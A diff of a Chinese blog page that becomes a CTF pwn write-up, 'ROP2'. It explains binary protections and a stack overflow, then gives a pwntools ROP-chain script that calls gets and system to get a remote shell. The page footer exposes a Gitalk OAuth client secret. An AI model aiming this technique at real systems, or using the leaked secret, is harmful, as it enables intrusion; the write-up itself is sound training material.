@@ -20,17 +20,30 @@
   <meta http-equiv="window-target" content="_top">
   
   
-  <title>分类: 壳 | BufSnake</title>
-  <meta name="keywords" content="reverse engine">
-<meta property="og:type" content="website">
-<meta property="og:title" content="SNAKEのBlog">
-<meta property="og:url" content="https://bufsnake.github.io/categories/PE文件/壳/index.html">
+  <title>PWN 学习—某平台ROP2 writeup | BufSnake</title>
+  <meta name="description" content="64位栈帧学习 writeup本能反应  RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这">
+<meta name="keywords" content="-writeup -pwntools -pwn -rop">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN 学习—某平台ROP2 writeup">
+<meta property="og:url" content="https://bufsnake.github.io/2019/08/02/PWN-学习—某平台ROP2-writeup/index.html">
 <meta property="og:site_name" content="SNAKEのBlog">
+<meta property="og:description" content="64位栈帧学习 writeup本能反应  RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801133227230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801133542892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801134127503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801134342899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801134235968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190801134745690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019080113425954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/201908011352587.png">
+<meta property="og:updated_time" content="2019-08-02T09:18:23.384Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SNAKEのBlog">
+<meta name="twitter:title" content="PWN 学习—某平台ROP2 writeup">
+<meta name="twitter:description" content="64位栈帧学习 writeup本能反应  RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190801133227230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70">
   <!-- Canonical links -->
-  <link rel="canonical" href="https://bufsnake.github.io/categories/PE文件/壳/index.html">
+  <link rel="canonical" href="https://bufsnake.github.io/2019/08/02/PWN-学习—某平台ROP2-writeup/index.html">
   
     <link rel="alternate" href="/atom.xml" title="SNAKEのBlog" type="application/atom+xml">
   
@@ -350,73 +363,170 @@
 </aside>
 
   
-  <main class="main" role="main">
-  <article class="content article article-categories article-type-list" itemscope>
-    <header class="article-header">
-      <h1 itemprop="name" class="hidden-xs">分类: 壳</h1>
-      <p class="hidden-xs">共 1 篇文章</p>
-      <nav role="navigation" id="nav-main" class="okayNav">
-        <ul>
-          <li><a href="/categories">All</a></li>
-          
-          <li><a href="/categories/PE文件/">PE文件</a></li>
-          
-          <li><a href="/categories/pwn/">-pwn</a></li>
-          
-          <li><a href="/categories/fuzz/">fuzz</a></li>
-          
-          <li><a href="/categories/PE文件/壳/">壳</a></li>
-          
-          <li><a href="/categories/IDE/">IDE</a></li>
-          
-          <li><a href="/categories/折腾/">折腾</a></li>
-          
-          <li><a href="/categories/Windows驱动开发/">Windows驱动开发</a></li>
-          
-          <li><a href="/categories/CTF/">CTF</a></li>
-          
-          <li><a href="/categories/framework/">framework</a></li>
-          
-          <li><a href="/categories/Tools/">Tools</a></li>
-          
-          <li><a href="/categories/CTF/Android/">Android</a></li>
-          
-          <li><a href="/categories/framework/Tools/">Tools</a></li>
-          
-        </ul>
-      </nav>
-    </header>
-    <!-- /header -->
-    <div class="article-body">
-      <div class="panel panel-default b-no">
-    <div class="panel-heading" role="tab">
-        <h4 class="panel-title">
-            <a data-toggle="collapse" href="#collapse壳" aria-expanded="true">
-              <i class="icon icon-folder text-active"></i><i class="icon icon-folder-open text"></i>
-              壳
-            </a>
-            <small class="text-muted">(Total 1 articles)</small>
-        </h4>
-    </div>
-    <div id="collapse壳" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="heading壳">
-        <div class="panel-body">
-            <div class="collection">
-              
-                
-<a href="/2019/05/12/PE文件之导入表/" class="collection-item" target="_blank" itemprop="url">
-  <time datetime="2019-05-12T09:22:50.000Z" itemprop="datePublished">2019-05-12</time>
-  <span>&nbsp;&nbsp;&nbsp;</span> PE文件之导入表
-</a>
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-PWN-学习—某平台ROP2-writeup" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PWN 学习—某平台ROP2 writeup
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2019/08/02/PWN-学习—某平台ROP2-writeup/" class="article-date">
+	  <time datetime="2019-08-02T09:16:46.000Z" itemprop="datePublished">2019-08-02</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/pwn/">-pwn</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/writeup-pwntools-pwn-rop/">-writeup -pwntools -pwn -rop</a>
+  </span>
 
 
-              
-            </div>
-        </div>
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/08/02/PWN-学习—某平台ROP2-writeup/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
     </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h3 id="64位栈帧学习"><a href="#64位栈帧学习" class="headerlink" title="64位栈帧学习"></a>64位栈帧学习</h3><p><img src="https://img-blog.csdnimg.cn/20190801133227230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><h4 id="本能反应"><a href="#本能反应" class="headerlink" title="本能反应"></a>本能反应</h4><p><img src="https://img-blog.csdnimg.cn/20190801133542892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表<br>Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过<br>NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br>PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </p>
+</blockquote>
+<h4 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h4><p><img src="https://img-blog.csdnimg.cn/20190801134127503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>发现输入一定的长度，程序就崩溃了</p>
+</blockquote>
+<h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><p><img src="https://img-blog.csdnimg.cn/20190801134342899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>查看要程序逻辑<br>发现存在栈溢出漏洞<br>输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了</p>
+</blockquote>
+<h5 id="查看函数表"><a href="#查看函数表" class="headerlink" title="查看函数表"></a>查看函数表</h5><p><img src="https://img-blog.csdnimg.cn/20190801134235968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="发现函数joke"><a href="#发现函数joke" class="headerlink" title="发现函数joke"></a>发现函数joke</h5><p><img src="https://img-blog.csdnimg.cn/20190801134745690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>似乎用不到的函数</p>
+</blockquote>
+<h5 id="接下来查看字符串"><a href="#接下来查看字符串" class="headerlink" title="接下来查看字符串"></a>接下来查看字符串</h5><p><img src="https://img-blog.csdnimg.cn/2019080113425954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>我无敌的/bin/sh字符串竟然没有，还好有gets和system函数</p>
+</blockquote>
+<h5 id="思考利用方法"><a href="#思考利用方法" class="headerlink" title="思考利用方法"></a>思考利用方法</h5><blockquote>
+<p>调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”);</p>
+</blockquote>
+<h5 id="实操过程"><a href="#实操过程" class="headerlink" title="实操过程"></a>实操过程</h5><p><img src="https://img-blog.csdnimg.cn/201908011352587.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数<br>pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中<br>所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)<br>程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数</p>
+</blockquote>
+<pre><code>接下来时调用system函数
+
+&gt; 我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方
+&gt; 我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，
+&gt; gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用
+</code></pre><h5 id="此时栈空间如图"><a href="#此时栈空间如图" class="headerlink" title="此时栈空间如图"></a>此时栈空间如图</h5><pre><code>![在这里插入图片描述](https://img-blog.csdnimg.cn/20190801142905989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70)
+</code></pre><h5 id="附上payload"><a href="#附上payload" class="headerlink" title="附上payload"></a>附上payload</h5><pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = remote(<span class="string">"ip"</span>,port)</span><br><span class="line">pros = ELF(<span class="string">'./rop2'</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6010F0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008e3</span></span><br><span class="line"></span><br><span class="line">system_addr = pros.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets_addr = pros.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">4</span> +<span class="string">'a'</span>*<span class="number">8</span> </span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)</span><br><span class="line">pro.readuntil(<span class="string">"~"</span>)</span><br><span class="line">pro.sendline(payload)</span><br><span class="line">pro.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure>
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20190801140937646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjQwMjQz,size_16,color_FFFFFF,t_70)
+</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><pre><code>&gt; PWN 学习之路永无止境
+</code></pre>
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://bufsnake.github.io/2019/08/02/PWN-学习—某平台ROP2-writeup/" title="PWN 学习—某平台ROP2 writeup" target="_blank" rel="external">https://bufsnake.github.io/2019/08/02/PWN-学习—某平台ROP2-writeup/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://bufsnake.github.io" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/favicon.jpg" class="img-rounded w-full" alt>
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://bufsnake.github.io" target="_blank"><span class="text-dark">Snake</span><small class="ml-1x">星球流浪者</small></a></h3>
+        <div>星球流浪者</div>
+      </div>
+    </figure>
+  </div>
 </div>
+
+
     </div>
   </article>
-   
+  
+    
+  <section id="comments">
+  	
+           
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2019/06/02/WDF-helloworld/" title="WDF-helloworld"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
 </main>
 
   <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
@@ -469,6 +579,33 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <!-- <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"> -->
+  <script src="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+  <script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: 'b195cb714bed076a20d4',
+    clientSecret: '43aecb9c84e95bb865960b70c6ba7fe56f6516fb',
+    repo: 'BlogCommentSystem',
+    owner: 'bufsnake',
+    admin: ['bufsnake'],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+  })
+  gitalk.render('comments')
+  </script>
+
+      
 
 
 
